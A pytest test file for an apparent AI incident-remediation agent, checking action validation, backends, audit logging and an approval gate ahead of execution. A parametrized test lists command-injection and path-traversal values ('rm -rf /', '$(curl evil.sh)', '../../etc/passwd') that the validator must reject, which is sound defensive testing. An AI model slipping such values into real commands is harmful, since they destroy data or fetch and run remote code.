"""Actions (E5.3), parameter validation (E9.3), audit (E9.6), graph structure (E9.2)."""

import json
from pathlib import Path
from uuid import uuid4

import httpx
import pytest
from sqlalchemy import text
from sqlalchemy.ext.asyncio import AsyncEngine

from aegisops_agent.actions import (
    ActionExecutor,
    ActionRejectedError,
    AuditWriter,
    LiveBackend,
    ReplayBackend,
    validate,
)
from aegisops_agent.graph import Deps, build_graph, build_nodes
from aegisops_agent.llm import RecordedLLM
from aegisops_agent.remediation import Action, load_policy
from aegisops_agent.run import initial_state, make_graph
from aegisops_agent.schemas import Budget
from aegisops_tools.context import ToolContext
from aegisops_tools.db import session_factory
from aegisops_tools.testing import NOW, delete_scenario, seed_payment_failure

POLICY = load_policy("config/policy.yaml")
CASSETTE = "packages/agent/tests/cassettes/s1_payment_failure.yaml"


# --- E9.3 validation ------------------------------------------------------------------


def test_valid_requests_are_normalised() -> None:
    assert validate(
        POLICY,
        Action.toggle_flag,
        {"flag": "paymentFailure", "variant": "off", "service": "payment", "x": 1},
    ) == {"flag": "paymentFailure", "variant": "off"}
    assert validate(POLICY, Action.restart_service, {"service": "payment"}) == {
        "service": "payment"
    }
    assert validate(POLICY, Action.scale_service, {"service": "checkout", "replicas": "2"}) == {
        "service": "checkout",
        "replicas": 2,
    }
    assert validate(POLICY, Action.rollback_deployment, {"service": "checkout"}) == {
        "service": "checkout",
        "to_version": "previous",
    }


@pytest.mark.parametrize(
    ("action", "params", "match"),
    [
        (Action.restart_service, {"service": "payment; rm -rf /"}, "not allowlisted"),
        (Action.restart_service, {"service": "$(curl evil.sh)"}, "not allowlisted"),
        (
            Action.restart_service,
            {"service": "flagd"},
            "not allowlisted",
        ),  # real service, not allowed
        (Action.restart_service, {"service": ""}, "not allowlisted"),
        (
            Action.toggle_flag,
            {"flag": "paymentFailure", "variant": "off && reboot"},
            "not a valid variant",
        ),
        (Action.toggle_flag, {"flag": "loadGeneratorVUs", "variant": "50"}, "not allowlisted"),
        (Action.toggle_flag, {"flag": "../../etc/passwd", "variant": "off"}, "not allowlisted"),
        (Action.scale_service, {"service": "checkout", "replicas": 50}, r"outside 1\.\.3"),
        (Action.scale_service, {"service": "checkout", "replicas": 0}, r"outside 1\.\.3"),
        (Action.scale_service, {"service": "checkout", "replicas": "many"}, "integer"),
        (
            Action.rollback_deployment,
            {"service": "checkout", "to_version": "v1 --privileged"},
            "not a valid version",
        ),
        (Action.none, {}, "nothing to execute"),
    ],
)
def test_malicious_or_out_of_policy_params_are_rejected(
    action: Action, params: dict, match: str
) -> None:  # type: ignore[type-arg]
    with pytest.raises(ActionRejectedError, match=match):
        validate(POLICY, action, params)


# --- E5.3 backends ----------------------------------------------------------------------


def _flagd(tmp: Path) -> Path:
    p = tmp / "demo.flagd.json"
    p.write_text(
        json.dumps(
            {
                "flags": {
                    "paymentFailure": {"defaultVariant": "100%", "variants": {"off": 0, "100%": 1}}
                }
            }
        )
    )
    return p


async def test_live_toggle_is_atomic_and_checks_variants(tmp_path: Path) -> None:
    p = _flagd(tmp_path)
    live = LiveBackend(flagd_path=p)
    out = await live.run(Action.toggle_flag, {"flag": "paymentFailure", "variant": "off"})
    assert out.ok and out.details == "paymentFailure: 100% -> off" and not out.simulated
    assert json.loads(p.read_text())["flags"]["paymentFailure"]["defaultVariant"] == "off"
    assert not list(tmp_path.glob("*.tmp"))  # temp file renamed into place
    bad = await live.run(Action.toggle_flag, {"flag": "paymentFailure", "variant": "50%"})
    assert not bad.ok and "not one of" in bad.details
    missing = await live.run(Action.toggle_flag, {"flag": "nope", "variant": "off"})
    assert not missing.ok


async def test_live_restart_uses_fixed_docker_endpoints(tmp_path: Path) -> None:
    seen: list[tuple[str, str]] = []

    def docker(req: httpx.Request) -> httpx.Response:
        seen.append((req.method, req.url.path))
        if req.url.path == "/containers/json":
            labels = json.loads(req.url.params["filters"])["label"]
            assert (
                "com.docker.compose.service=payment" in labels
                and "com.docker.compose.project=opentelemetry-demo" in labels
            )
            return httpx.Response(200, json=[{"Id": "abc"}])
        return httpx.Response(204)

    live = LiveBackend(
        flagd_path=_flagd(tmp_path),
        http=httpx.AsyncClient(transport=httpx.MockTransport(docker), base_url="http://docker"),
    )
    out = await live.run(Action.restart_service, {"service": "payment"})
    assert out.ok and seen == [("GET", "/containers/json"), ("POST", "/containers/abc/restart")]
    assert not (
        await live.run(Action.scale_service, {"service": "checkout", "replicas": 2})
    ).ok  # unsupported by the demo


async def test_live_restart_without_socket_or_container(tmp_path: Path) -> None:
    no_socket = LiveBackend(flagd_path=_flagd(tmp_path))
    ex = ActionExecutor(policy=POLICY, live=no_socket)
    out = await ex.execute(
        Action.restart_service, {"service": "payment"}, replay=False, run_id=None, actor="t"
    )
    assert not out.ok and "no Docker socket" in out.details
    empty = LiveBackend(
        flagd_path=_flagd(tmp_path),
        http=httpx.AsyncClient(
            transport=httpx.MockTransport(lambda r: httpx.Response(200, json=[])),
            base_url="http://d",
        ),
    )
    assert (
        "no container" in (await empty.run(Action.restart_service, {"service": "payment"})).details
    )


async def test_executor_picks_backend_and_audits(engine: AsyncEngine, tmp_path: Path) -> None:
    marker = uuid4().hex
    audit = AuditWriter(session_factory(engine))
    ex = ActionExecutor(
        policy=POLICY,
        replay=ReplayBackend(alert_cleared=True),
        live=LiveBackend(flagd_path=_flagd(tmp_path)),
        audit=audit,
    )
    replayed = await ex.execute(
        Action.toggle_flag,
        {"flag": "paymentFailure", "variant": "off"},
        replay=True,
        run_id=None,
        actor=f"t:{marker}",
    )
    assert replayed.ok and replayed.simulated and replayed.alert_cleared is True
    live = await ex.execute(
        Action.toggle_flag,
        {"flag": "paymentFailure", "variant": "off"},
        replay=False,
        run_id=None,
        actor=f"t:{marker}",
    )
    assert live.ok and not live.simulated
    rejected = await ex.execute(
        Action.restart_service,
        {"service": "payment; rm -rf /"},
        replay=False,
        run_id=None,
        actor=f"t:{marker}",
    )
    assert not rejected.ok and rejected.details.startswith("rejected:")
    no_live = ActionExecutor(policy=POLICY)
    assert (
        "no live backend"
        in (
            await no_live.execute(
                Action.restart_service, {"service": "payment"}, replay=False, run_id=None, actor="t"
            )
        ).details
    )
    async with session_factory(engine)() as s:
        rows = (
            await s.execute(
                text(
                    "SELECT tool, ok, args->>'simulated' FROM audit_log WHERE actor = :a ORDER BY id"
                ),
                {"a": f"t:{marker}"},
            )
        ).all()
        await s.execute(text("DELETE FROM audit_log WHERE actor = :a"), {"a": f"t:{marker}"})
        await s.commit()
    assert [(r[0], r[1], r[2]) for r in rows] == [
        ("toggle_flag", True, "true"),
        ("toggle_flag", True, "false"),
        ("restart_service", False, "false"),
    ]


# --- E9.2 graph structure -------------------------------------------------------------


def test_the_only_edge_into_execute_comes_from_approval() -> None:
    """PROJECT.md §9.2 / NFR-07: no action is reachable without the approval node."""
    graph = build_graph(Deps(llm=RecordedLLM(responses={}), tools=None, budget=Budget()))  # type: ignore[arg-type]
    g = graph.get_graph()
    into_execute = {e.source for e in g.edges if e.target == "execute"}
    assert into_execute == {"approval"}
    assert {e.target for e in g.edges if e.source == "execute"} == {"__end__"}
    # and approval's edge to execute is conditional (on the decision), never unconditional
    assert all(e.conditional for e in g.edges if e.source == "approval" and e.target == "execute")


async def test_execute_node_refuses_a_bypass() -> None:
    """Second guard: even if something routed here, execute checks the decision itself."""
    nodes = build_nodes(Deps(llm=RecordedLLM(responses={}), tools=None, budget=Budget()))  # type: ignore[arg-type]
    with pytest.raises(RuntimeError, match="graph bypass"):
        await nodes["execute"](
            {"approval": {"decision": "rejected"}, "remediation": {"action": "restart_service"}}
        )  # type: ignore[typeddict-item]


@pytest.fixture
async def scenario(engine: AsyncEngine):  # type: ignore[no-untyped-def]
    sc = f"T-{uuid4().hex[:8]}"
    await seed_payment_failure(engine, sc)
    try:
        yield sc
    finally:
        await delete_scenario(engine, sc)


@pytest.mark.parametrize(("decision", "executed"), [("approved", True), ("rejected", False)])
async def test_graph_executes_only_after_approval(
    engine: AsyncEngine, scenario: str, decision: str, executed: bool
) -> None:
    ex = ActionExecutor(policy=POLICY, replay=ReplayBackend())
    graph, _ = make_graph(
        engine=engine,
        llm=RecordedLLM.from_file(CASSETTE),
        ctx=ToolContext(scenario_id=scenario, frozen_now=NOW),
        policy=POLICY,
        executor=ex,
    )
    final = await graph.ainvoke(
        initial_state(
            service="payment", alert_summary="a", incident_id=None, auto_decision=decision
        ),
        config={"configurable": {"thread_id": f"t-{scenario}-{decision}"}},
    )
    assert ("execution" in final) is executed
    if executed:
        assert (
            final["execution"]["ok"]
            and final["execution"]["simulated"]
            and final["execution"]["action"] == "toggle_flag"
        )


async def test_public_mode_never_executes(engine: AsyncEngine, scenario: str) -> None:
    ex = ActionExecutor(policy=POLICY, replay=ReplayBackend())
    graph, _ = make_graph(
        engine=engine,
        llm=RecordedLLM.from_file(CASSETTE),
        ctx=ToolContext(scenario_id=scenario, frozen_now=NOW),
        policy=POLICY,
        executor=ex,
    )
    final = await graph.ainvoke(
        initial_state(
            service="payment",
            alert_summary="a",
            incident_id=None,
            auto_decision="approved",
            public_mode=True,
        ),
        config={"configurable": {"thread_id": f"t-{scenario}-pub"}},
    )
    assert final["execution"]["ok"] is False and "public mode" in final["execution"]["details"]
